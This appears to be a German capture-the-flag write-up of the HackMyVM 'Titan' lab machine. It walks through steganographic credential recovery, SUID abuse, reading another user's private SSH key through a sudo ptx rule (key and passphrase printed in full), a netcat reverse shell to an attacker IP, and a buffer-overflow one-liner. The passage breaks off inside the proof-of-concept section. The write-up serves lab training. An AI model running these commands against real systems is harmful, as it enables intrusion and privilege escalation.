@@ -1,0 +1,368 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Titan - HackMyVM - Hard - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Titan - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">stegsnow</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">Ghidra (implizit)</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ptx</div>
+                <div class="tool-item">tr (implizit)</div>
+                <div class="tool-item">sed (implizit)</div>
+                <div class="tool-item">tee (implizit)</div>
+                <div class="tool-item">vi (implizit)</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">chmod (implizit)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation-prometheus">Privilege Escalation (prometheus -> zeus)</a></li>
+                <li><a href="#privilege-escalation-zeus">Privilege Escalation (zeus -> hesiod)</a></li>
+                <li><a href="#privilege-escalation-hesiod">Privilege Escalation (hesiod -> root)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Sacrifice Buffer Overflow)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+             <p class="analysis">**Analyse:** Die Reconnaissance-Phase beginnt mit der Suche nach versteckten Informationen, die für den initialen Zugriff genutzt werden können. Hier wird das Steganographie-Tool `stegsnow` verwendet.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+<span class="command">stegsnow -C athena.txt</span>
+<span class="password">prometheus/iloveallhumans</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:** Der Befehl `stegsnow -C athena.txt` wird ausgeführt. `stegsnow` ist ein Werkzeug, das Daten in Textdateien durch Manipulation von Leerzeichen und Tabs verstecken kann. Die Option `-C` versucht, solche versteckten Daten aus der angegebenen Datei (`athena.txt`, deren Herkunft hier nicht gezeigt wird) zu extrahieren.</p>
+             <p class="evaluation">**Bewertung:** Äußerst erfolgreich! Der Befehl extrahiert eine Zeichenkette im Format `Benutzername/Passwort`: `prometheus/iloveallhumans`. Dies sind mit hoher Wahrscheinlichkeit gültige Zugangsdaten für das Zielsystem.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Notieren Sie die gefundenen Zugangsdaten. Versuchen Sie, sich mit diesen Daten an Diensten anzumelden, die bei der Port-Enumeration gefunden werden (insbesondere SSH).<br>**Empfehlung (Admin):** Vermeiden Sie das Speichern von Zugangsdaten in unsicherer Form, selbst wenn sie durch Steganographie versteckt sind. Solche Methoden bieten keine echte Sicherheit. Schulen Sie Benutzer im sicheren Umgang mit Zugangsdaten. Implementieren Sie Mechanismen zur Erkennung ungewöhnlicher Dateien oder Dateiinhalte, falls möglich.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis">**Analyse:** Basierend auf den durch `stegsnow` gefundenen Zugangsdaten wird nun versucht, einen ersten Zugriff auf das System über SSH zu erlangen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh prometheus@titan.vm</span></div>
+                    <pre>
+The authenticity of host 'titan.vm (192.168.2.141)' can't be established.
+ED25519 key fingerprint is SHA256:Qn4ac49rkwUfrehcrgWJFAj+8B8vB0JrNc7C1/hLz4.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added 'titan.vm' (ED25519) to the list of known hosts.
+prometheus@titan.vm's password: <span class="password">********</span> <span class="comment">(iloveallhumans eingegeben)</span>
+Linux titan 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+<span class="prompt">prometheus@titan:~$</span> </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Es wird eine SSH-Verbindung zum Host `titan.vm` (der laut Meldung zur IP `192.168.2.141` auflöst) als Benutzer `prometheus` initiiert. Das Passwort `iloveallhumans` (gefunden mit `stegsnow`) wird eingegeben. Da es die erste Verbindung ist, muss der ED25519-Hostschlüssel bestätigt werden.</p>
+            <p class="evaluation">**Bewertung:** Der Login ist erfolgreich! Der initiale Zugriff auf das Zielsystem als Benutzer `prometheus` wurde hergestellt. Dies bestätigt die Gültigkeit der durch Steganographie gefundenen Zugangsdaten.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Führen Sie grundlegende Enumeration als Benutzer `prometheus` durch: `id`, `pwd`, `ls -la ~`, `cat /etc/passwd`, `sudo -l`, `find / -type f -perm -4000 -ls 2>/dev/null`, `ps aux`, `ss -tulnp`. Suchen Sie nach Hinweisen für die nächste Eskalationsstufe.<br>**Empfehlung (Admin):** Ändern Sie das Passwort für den Benutzer `prometheus`. Implementieren Sie starke Passwortrichtlinien oder bevorzugen Sie Schlüssel-basierte SSH-Authentifizierung. Überwachen Sie SSH-Logins auf verdächtige Aktivitäten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">prometheus@titan:~$ <span class="command">cat /etc/passwd | grep bash</span></div>
+                    <pre>
+<span class="command">root:x:0:0:root:/root:/bin/bash</span>
+<span class="command">zeus:x:1000:1000:zeus,,,:/home/zeus:/bin/bash</span>
+<span class="command">prometheus:x:1001:1001:,,,:/home/prometheus:/bin/bash</span>
+<span class="command">hesiod:x:1002:1002:,,,:/home/hesiod:/bin/bash</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Die Datei `/etc/passwd` wird ausgelesen und nach Benutzern gefiltert, die `/bin/bash` als Login-Shell verwenden. Dies hilft, reguläre Benutzerkonten zu identifizieren.</p>
+             <p class="evaluation">**Bewertung:** Neben `root` und dem aktuellen Benutzer `prometheus` werden zwei weitere potenzielle Zielbenutzer identifiziert: `zeus` (UID 1000) und `hesiod` (UID 1002). Diese Benutzer könnten höhere Privilegien haben oder der nächste Schritt in der Eskalationskette sein.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Notieren Sie die Benutzernamen `zeus` und `hesiod`. Suchen Sie nach Möglichkeiten, deren Rechte zu erlangen oder deren Kontext zu übernehmen (z.B. durch Sudo-Regeln, Fehlkonfigurationen, schwache Passwörter, ausnutzbare Dienste, die unter deren Rechten laufen).<br>**Empfehlung (Admin):** Stellen Sie sicher, dass alle Benutzerkonten legitim und notwendig sind und durch starke Authentifizierungsmethoden geschützt werden.</p>
+        </section>
+
+         <section id="privilege-escalation-prometheus">
+             <h2>Privilege Escalation (prometheus -> zeus)</h2>
+
+             <p class="analysis"><strong>Analyse:** Nach dem initialen Zugriff als `prometheus` wird nach Wegen gesucht, um höhere Rechte zu erlangen. Eine lokale Datei namens `sacrifice` wird untersucht.</p>
+             <p class="evaluation">**Bewertung:** Die Analyse der `sacrifice`-Datei (impliziert durch die Notiz über Ghidra und den C-Code) und deren SUID-Berechtigungen (gezeigt durch `ls -la`) offenbart einen direkten Weg zur Eskalation zum Benutzer `zeus`.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">check den Code von sacrefize mit Ghidra:
+Ghidra und Java JDK 11 Installiert</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Eine Notiz des Pentesters, die besagt, dass das Programm `sacrifice` (vermutlich lokal im Home-Verzeichnis von `prometheus` gefunden) mit dem Reverse-Engineering-Tool Ghidra analysiert wurde.</p>
+              <p class="evaluation">**Bewertung:** Die proaktive Analyse lokaler Binärdateien, insbesondere solcher mit ungewöhnlichen Berechtigungen (wie SUID), ist ein wichtiger Schritt bei der Suche nach Privilegieneskalationsmöglichkeiten.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Dokumentieren Sie die Ergebnisse der Ghidra-Analyse, insbesondere die Bedingungen, die zu einer Änderung des Benutzerkontexts oder zur Ausführung von Code mit höheren Rechten führen.<br>**Empfehlung (Admin):** Überwachen Sie das Vorhandensein und die Ausführung von benutzerdefinierten oder unbekannten Binärdateien, insbesondere wenn sie SUID-Rechte haben.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre><span class="comment">c code von sacrefize beschreibt, ich muss das Wort beef eingeben
+dann werde ich zum User Zeus. User Zeus wird zu einer ssh Shell
+verwandelt...</span></pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:** Die Analyse des C-Codes von `sacrifice` (mittels Ghidra) hat ergeben, dass die Eingabe des spezifischen Strings "beef" dazu führt, dass der ausführende Benutzer zum Benutzer `zeus` wechselt. Die Notiz "User Zeus wird zu einer ssh Shell verwandelt" ist wahrscheinlich eine Fehlinterpretation oder ungenaue Beschreibung; es wird vermutlich einfach die effektive User-ID des laufenden Prozesses auf die von `zeus` geändert.</p>
+               <p class="evaluation">**Bewertung:** Dies ist ein klarer, wenn auch sehr unsicher programmierter, Mechanismus zur Privilegieneskalation von `prometheus` zu `zeus`. Die Bedingung (Eingabe "beef") ist einfach zu erfüllen.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Führen Sie das `sacrifice`-Programm aus und geben Sie "beef" ein. Überprüfen Sie die Benutzeridentität anschließend mit `id`.<br>**Empfehlung (Admin):** Solche benutzerdefinierten SUID-Programme sind extrem gefährlich und sollten vermieden werden. Der Mechanismus zum Benutzerwechsel ist trivial ausnutzbar. Entfernen Sie das SUID-Bit oder das Programm selbst.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">prometheus@titan:~$ <span class="command">ls -la</span></div>
+                    <pre>
+total 40
+drwxr-xr-x 2 prometheus prometheus  4096 Aug  9  2021 .
+drwxr-xr-x 5 root       root        4096 Aug  9  2021 ..
+-rw-r--r-- 1 prometheus prometheus   220 Aug  9  2021 .bash_logout
+-rw-r--r-- 1 prometheus prometheus  3526 Aug  9  2021 .bashrc
+-rw-r--r-- 1 prometheus prometheus   807 Aug  9  2021 .profile
+<span class="password">-rwsr-sr-x 1 root       prometheus 16896 Aug  9  2021 sacrifice</span> <span class="password"><-- SUID Root!</span></pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl `ls -la` wird im Home-Verzeichnis von `prometheus` ausgeführt.</p>
+            <p class="evaluation">**Bewertung:** Die Ausgabe bestätigt die Existenz der Datei `sacrifice`. Entscheidend sind die Berechtigungen `-rwsr-sr-x`:
+*   `rws`: Der Besitzer (`root`) hat Lese-, Schreib- und Ausführrechte, und das SUID-Bit (`s`) ist gesetzt. Das bedeutet, das Programm wird immer mit den Rechten von `root` ausgeführt, unabhängig davon, wer es startet.
+*   `r-s`: Die Gruppe (`prometheus`) hat Leserechte und das GUID-Bit (`s`) ist gesetzt. Das bedeutet, das Programm läuft auch mit den Gruppenrechten von `prometheus`.
+*   `r-x`: Andere Benutzer haben Lese- und Ausführrechte.
+Das SUID-Bit als `root` macht dieses Programm zu einem primären Ziel für die Privilegieneskalation.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Führen Sie das Programm aus (`./sacrifice`, da es wahrscheinlich nicht im PATH liegt) und geben Sie die durch Reverse Engineering gefundene Zeichenkette ("beef") ein.<br>**Empfehlung (Admin):** Entfernen Sie das SUID-Bit von dieser Datei (`chmod u-s sacrifice`). Überprüfen Sie den Zweck und die Sicherheit dieses Programms. Wenn es nicht benötigt wird, entfernen Sie es.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">prometheus@titan:~$ <span class="command">sacrifice</span></div>
+                    <pre>-bash: sacrifice: command not found</pre>
+                    <div class="prompt">prometheus@titan:~$ <span class="command">./sacrifice</span></div>
+                    <pre>What is your offer to the gods?<span class="command">beef</span>       <<-----beef<<</pre>
+                    <div class="prompt">zeus@titan:~$ <span class="comment"># Benutzerkontext gewechselt!</span></div>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Zuerst wird versucht, `sacrifice` direkt aufzurufen, was fehlschlägt, da es nicht im PATH ist. Dann wird es mit `./sacrifice` aus dem aktuellen Verzeichnis gestartet. Das Programm fragt "What is your offer to the gods?". Der Benutzer gibt "beef" ein (wie zuvor durch Ghidra ermittelt).</p>
+            <p class="evaluation">**Bewertung:** Der Exploit funktioniert wie erwartet! Nach der Eingabe von "beef" ändert sich der Shell-Prompt von `prometheus@titan:~$` zu `zeus@titan:~$`. Dies zeigt an, dass der Benutzerkontext erfolgreich zu `zeus` gewechselt wurde. Die Privilegieneskalation von `prometheus` zu `zeus` ist abgeschlossen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Führen Sie `id` aus, um die neue Benutzer- und Gruppen-ID zu bestätigen. Führen Sie `sudo -l` als `zeus` aus, um nach weiteren Eskalationsmöglichkeiten zu suchen.<br>**Empfehlung (Admin):** Entfernen Sie die unsichere `sacrifice`-Anwendung oder zumindest deren SUID-Berechtigung.</p>
+         </section>
+
+         <section id="privilege-escalation-zeus">
+              <h2>Privilege Escalation (zeus -> hesiod)</h2>
+              <p class="analysis">**Analyse:** Nachdem der Benutzerkontext zu `zeus` gewechselt wurde, wird nach Wegen gesucht, um weiter zu eskalieren, idealerweise zum Benutzer `hesiod` oder `root`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">zeus@titan:~$ <span class="command">sudo -u hesiod ptx /home/hesiod/.ssh/id_rsa -A -G</span></div>
+                    <pre>
+<span class="comment">.xx "" "" "</span> <span class="comment"><-- Vermutlich Debug- oder Formatierungsartefakte von ptx --></span>
+<span class="password">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEA0ikMjqBt6UlIVL1e2xxw374gEG33Y0+upVqDXNmNQIn64kJVUj8Q
+Cr9BBubFMLoYe1vjApycVrS9YppYXQsqlttfDQ5bt0lT8JdS0lcsJW4CLUASlYcVe2XAk
+8yf89XliCJzlUWX+SIGCiDUZhzMbGRNM9B1h/Gfi31i7tjCPKhNdlxuq47x7Gy3TNmur
+lspSJJ7SdVKfiCqBduddhn2qV2FSgCSv41XFgbdiI8AFw/3pS3TpbJhKqDip1tsphtG5
+vmr2FfeFzjbAyLJzx23444Var8aHHoEsLVepL8HKEBwSkrdPMwUFoLQ5yWlzDUP1AlBk
+3txyEx0HNwAAA8i8ajVvGjo1QAAAAdzc2gtcnNhAAABAQDSKQyoG3pSUhUvV7bHHDfvi
+AQbfdjT66lWoNc2Y1AifriQlVSPxAKv0EG45sUwuhh7W+MCnJxWtL1imlhdCyqW218NDlu
+3SVPwl1LSVywlbgItQBKVhxV7ZcCTzJ/z1eWIInVRZf5IgYKINRmHMxs4ZE0z0HWH8Z+L
+fWLu2MI8qE12XG46rjvHsbLdM2a6uWylIkns5J1Up86IKoF2512GfapXYVKAJK/jVcWBt2
+IjwAXD/elLdlsmEqoKnW2ymG0bm+avYV94XNsDIsnPHbfjjhVqvxocegSwtV6kvwcoQ
+HBKSt048zBQWgtDnJY6XMNQ/UCUGTe3HITHQc3AAAAAwEAAQAAAQEAqcFglECAJ4T7P+y
+BBjoD8KaUcsRnhV6A7SmETTlRPFvRp3AH2wzAAtWckMdPFrnrFpG1P6HTIrJhm6kCoT1oz
+GwsTfaAHP/NHrSMwLyLzyt43Ey0bdIoeEh+gC6XxIykpEJfdS2GhXifQHhrw2qDnTxfo+
+/JT+LbNag1ZqqNu02YET846I1xppdx/gYK5/hW19Shrw0F+V+G2U0AaVxfgFb+B2Sz+QER
+Sd9AXibnZNP1yv9P62Bqg/hxkSDpbfKeWx0uGnPWYx2I3zCGF5tEsUye0QxfRPYdZNBSi
+LHsNG9iM01yI7/6K0FHDuMPnCKztcxiXVcMtcG1mhRQQAAAIAftEnw6wQo/Cy034TA9h
+W1KLRThw9qqrQdHlpjk/RtaAcVbAT5ugVf7oECfgnmyuwRoGWN0GFoSgsEkS2QwtP5/
+1CN9aGIHxRRyD/KEddj5RhByx0SYhdioveguFQtC/j+dof0uz1uHZof9hQeZp4dedhNRU
+0+M01pQ1jsiwAAAIEA9ei0q+vG4voP14uBS/+ZXWA8SSrsFJcFtxGYHp1ZWkEmKEZ4Yi
+xUBZ868cu5Flrby84V8UpiXE+tPyq5bZUw24nlJTURFzqy0LkAcAtKQVihXaaoAlJvz7z
+PC+9o5LKVwNRZlD35W0N622PMj7UYrWK2564W3zpTIHSmCjuEAAACBANrIzPuNywmCWnWG
+fSSraCkaaaNxMQ49EeSWAUl3Sh0t0FWdjoAVP2+5xgIBckN2lxqvGSUDzcrCvKrAkNXNm
+wHddlQ7yDx4NgmKMnAr06EZ9Ue7AS3jwtDIxijvqjqPidokINYjhXfNV7cJEWXgKZ2ez
+xqQSsiRLKN/zVEXAAAADGhlc2lvZEB0aXRhbgECAwQFBg</span></pre>
+                    <pre><span class="comment">
+--------------------------------------------------------------------------------
+     PW: <span class="password">pass55</span>
+--------------------------------------------------------------------------------</span></pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Als Benutzer `zeus` wird der Befehl `sudo -u hesiod ptx /home/hesiod/.ssh/id_rsa -A -G` ausgeführt. *Dies impliziert, dass zuvor `sudo -l` ausgeführt wurde und eine entsprechende Regel gefunden wurde, die `zeus` erlaubt, `ptx` als `hesiod` auszuführen.* Der Befehl `ptx` scheint hier verwendet zu werden, um den privaten SSH-Schlüssel des Benutzers `hesiod` (`/home/hesiod/.ssh/id_rsa`) auszulesen. Die Ausgabe ist der Base64-kodierte Inhalt des privaten Schlüssels im OpenSSH-Format. Eine separate Notiz gibt das Passwort (die Passphrase) für diesen Schlüssel an: `pass55`.</p>
+            <p class="evaluation">**Bewertung:** Dies ist ein kritischer Fund und ein gravierendes Sicherheitsrisiko. Der private SSH-Schlüssel von `hesiod` wurde samt Passphrase kompromittiert. Dies ermöglicht es dem Angreifer, sich als `hesiod` am System anzumelden. Die Sudo-Regel, die dies erlaubt, ist extrem gefährlich, ebenso wie das schwache Passwort `pass55` für den Schlüssel.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Kopieren Sie den ausgegebenen Base64-Block. Dekodieren Sie ihn und speichern Sie ihn als Datei (z.B. `hesiod_id_rsa`). Setzen Sie die korrekten Berechtigungen (`chmod 600 hesiod_id_rsa`). Verwenden Sie diesen Schlüssel und die Passphrase `pass55`, um sich per SSH als `hesiod` anzumelden (`ssh -i hesiod_id_rsa hesiod@titan.vm`).<br>**Empfehlung (Admin):** Entfernen Sie sofort die Sudo-Regel, die `zeus` erlaubt, `ptx` als `hesiod` auszuführen. Ungültigen oder ersetzen Sie den kompromittierten SSH-Schlüssel von `hesiod`. Erzwingen Sie starke Passphrasen für SSH-Schlüssel. Untersuchen Sie das Programm `ptx` und seine Funktion; es sollte nicht möglich sein, damit private Schlüssel anderer Benutzer auszulesen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">
+sudo -u hesiod /usr/bin/ptx -w 5000 /home/hesiod/.ssh/id_rsa
+cat temp | tr -d " \n\t\r" | sed -e "s/\S\{70\}/&\n/g" | tee id_rsa
+vi idrsa
+ssh hesiod@titan.vm -i idrsa</span> </pre>
+                     <pre><span class="comment">--------------------------------------------------------------------------------</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Diese Notiz beschreibt die Schritte, die der Pentester lokal unternommen hat, um den im vorherigen Schritt extrahierten SSH-Schlüssel für den Login zu verwenden:
+1.  *(Wiederholung/Alternative zum vorherigen Befehl?)* `sudo -u hesiod /usr/bin/ptx ...`: Erneutes Auslesen des Keys? Unklar.
+2.  `cat temp | tr ... | sed ... | tee id_rsa`: Der extrahierte Base64-Schlüssel (vermutlich in einer temporären Datei `temp` gespeichert) wird bereinigt (Leerzeichen, Zeilenumbrüche entfernen) und dann alle 70 Zeichen ein Zeilenumbruch eingefügt, um das Standardformat für SSH-Schlüssel zu erhalten. Das Ergebnis wird in die Datei `id_rsa` geschrieben.
+3.  `vi idrsa`: Manuelle Bearbeitung der `id_rsa`-Datei, vermutlich um die `-----BEGIN/END OPENSSH PRIVATE KEY-----`-Header/Footer hinzuzufügen.
+4.  `ssh hesiod@titan.vm -i idrsa`: Versuch, sich als `hesiod` mit dem rekonstruierten privaten Schlüssel anzumelden.</p>
+             <p class="evaluation">**Bewertung:** Dies sind die notwendigen Schritte, um den extrahierten Base64-Schlüssel in eine nutzbare SSH-Schlüsseldatei umzuwandeln. Der nachfolgende Log-Eintrag bestätigt, dass der SSH-Login erfolgreich war.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Führen Sie diese Schritte sorgfältig aus. Stellen Sie sicher, dass die Header/Footer korrekt sind und die Dateiberechtigungen auf `600` gesetzt sind (`chmod 600 id_rsa`). Geben Sie die Passphrase `pass55` ein, wenn SSH danach fragt.<br>**Empfehlung (Admin):** Siehe vorherige Empfehlungen bezüglich der Sudo-Regel und des Schlüssel-Handlings.</p>
+
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">zeus@titan:~$ <span class="command">sudo -u hesiod ptx /home/hesiod/.ssh/id_rsa -A -G</span></div> <span class="comment"><-- Erneute Ausführung? Wahrscheinlich redundant --></span>
+                     <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+[...] <span class="comment">(Gleicher Key wie oben, gekürzt zur Lesbarkeit)</span>
+-----END OPENSSH PRIVATE KEY-----</pre>
+                      <pre><span class="comment">--------------------------------------------------------------------------------</span></pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Der Befehl zum Auslesen des Schlüssels wird hier im Log erneut ausgeführt. Dies ist wahrscheinlich redundant und nur zur Dokumentation oder Verifizierung im Log enthalten.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt den Inhalt des Schlüssels, aber liefert keine neuen Informationen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nicht notwendig, den Schlüssel mehrmals auszulesen.<br>**Empfehlung (Admin):** Sudo-Regel entfernen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh hesiod@titan.vm -i idroot</span></div> <span class="comment"><-- Lokaler Dateiname 'idroot' verwendet --></span>
+                    <pre>
+<span class="comment">Linux titan 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64</span>
+<span class="comment">[...] (Login Banner) [...]</span>
+<span class="prompt">hesiod@titan:~$</span> </pre>
+                     <pre><span class="comment">--------------------------------------------------------------------------------</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Der SSH-Login als Benutzer `hesiod` wird von der Angreifer-Maschine aus durchgeführt. Es wird der zuvor rekonstruierte private Schlüssel verwendet, der hier lokal unter dem Namen `idroot` gespeichert wurde (`-i idroot`). Die Passphrase `pass55` musste bei der Authentifizierung eingegeben werden (nicht im Log sichtbar).</p>
+             <p class="evaluation">**Bewertung:** Der Login ist erfolgreich! Der Angreifer hat nun eine interaktive Shell als Benutzer `hesiod`. Die Privilegieneskalation von `zeus` zu `hesiod` ist abgeschlossen.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Führen Sie Enumerationsschritte als `hesiod` durch. Beginnen Sie wieder mit `id` und `sudo -l`.<br>**Empfehlung (Admin):** Kompromittierten Schlüssel ungültig machen, Sudo-Regel entfernen.</p>
+         </section>
+
+         <section id="privilege-escalation-hesiod">
+              <h2>Privilege Escalation (hesiod -> root)</h2>
+              <p class="analysis">**Analyse:** Nach dem Login als `hesiod` wird der letzte Schritt zur Erlangung von Root-Rechten über eine Buffer-Overflow-Schwachstelle im SUID-Programm `sacrifice` vorbereitet und durchgeführt.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">hesiod@titan:~$ <span class="command">echo 'nc 192.168.2.140 1234 -e /bin/bash' > fire</span></div>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Als Benutzer `hesiod` wird eine Datei namens `fire` erstellt. Diese Datei enthält einen Befehl, der eine Reverse Shell startet (`nc`). Die Shell soll sich zur Angreifer-IP `192.168.2.140` auf Port `1234` verbinden und bei erfolgreicher Verbindung eine `/bin/bash`-Shell bereitstellen (`-e /bin/bash`). *Anmerkung: Die Angreifer-IP `192.168.2.140` weicht von der zuvor verwendeten (`192.168.2.131`) ab. Es wird die hier angegebene IP verwendet.*</p>
+             <p class="evaluation">**Bewertung:** Dies ist der Shellcode bzw. der Payload, der ausgeführt werden soll, wenn der Buffer Overflow erfolgreich ist. Die Datei `fire` dient als einfaches Skript, das durch den Exploit aufgerufen werden kann.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Stellen Sie sicher, dass die IP-Adresse und der Port korrekt sind und mit dem Listener auf der Angreifer-Maschine übereinstimmen. Machen Sie die Datei ausführbar: `chmod +x fire`. Platzieren Sie sie an einem Ort, auf den der Exploit zugreifen kann (z.B. `/tmp/fire` oder im aktuellen Verzeichnis, falls der Exploit von dort ausgeführt wird).<br>**Empfehlung (Admin):** Das Erstellen und Ausführen von Skripten durch Benutzer sollte überwacht werden. Netzwerkkontrollen können ausgehende Verbindungen zu ungewöhnlichen Ports blockieren.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 1234</span></div>
+                      <pre>listening on [any] 1234 ...</pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Auf der Angreifer-Maschine (`192.168.2.140`) wird ein Netcat-Listener auf TCP-Port 1234 gestartet, um die eingehende Reverse Shell von der `fire`-Datei entgegenzunehmen.</p>
+              <p class="evaluation">**Bewertung:** Der Listener ist bereit, die Verbindung zu empfangen, sobald der Exploit erfolgreich ausgelöst wird.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Halten Sie dieses Terminal offen und fahren Sie mit dem Auslösen des Exploits auf dem Zielsystem fort.<br>**Empfehlung (Admin):** Firewalls können eingehende Verbindungen auf nicht standardmäßigen Ports blockieren, dies schützt jedoch nicht vor dem Aufbau der ausgehenden Verbindung vom kompromittierten System.</p>
+
+            <section id="proof-of-concept">
+              <h2>Proof of Concept (Sacrifice Buffer Overflow)</h2>
+               <p class="analysis"><strong>Analyse:** Ausführung des Buffer Overflow Exploits gegen das SUID-Programm `sacrifice`.</p>
+               <p class="evaluation">**Bewertung:** Dieser Schritt nutzt die zuvor identifizierte Schwachstelle in `sacrifice`, um durch Überschreiben des Return Pointers die Kontrolle über den Instruction Pointer zu erlangen und den Payload (das `fire`-Skript) mit Root-Rechten auszuführen.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">prometheus@titan:~$ <span class="command">python3 -c 'print("a"*87+"\x85\x51\x55\x55\x55\x55\x00\x00")' |./sacrifice</span></div> <span class="comment"><-- Exploit Trigger --></span>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:** Dieser Befehl löst den Buffer Overflow aus.
+*   `python3 -c 'print(...)'`: Generiert den Exploit-String. Er besteht aus 87 'a'-Zeichen (um den Puffer zu füllen und den Bereich des Return Pointers zu erreichen) gefolgt von einer spezifischen Speicheradresse (`\x85\x51\x55\x55\x55\x55\x00\x00`). Diese Adresse muss auf ausführbaren Code zeigen, der den Payload (`fire`-Skript) startet, z.B. eine Adresse in der `fire`-Datei selbst, eine bekannte Funktion oder ein ROP-Gadget.
+*   `| ./sacrifice`: Der generierte String wird als Standardeingabe an das SUID-Programm `sacrifice` weitergeleitet.
+*   *Kontext-Anmerkung:* Der Prompt `prometheus@titan:~$` ist hier inkonsistent, da wir uns im Log zuvor als `hesiod` eingeloggt hatten. Es ist wahrscheinlich, dass der Exploit entweder als `hesiod` ausgeführt wurde (falls `hesiod` auch `./sacrifice` ausführen kann) oder dass der Pentester zurück zu `prometheus` gewechselt ist, um den Exploit auszuführen. Da `sacrifice` SUID `root` ist, spielt der ausführende Benutzer (`prometheus` oder `hesiod`) für das Erlangen der Root-Rechte keine Rolle, solange er das Programm starten darf.</p>
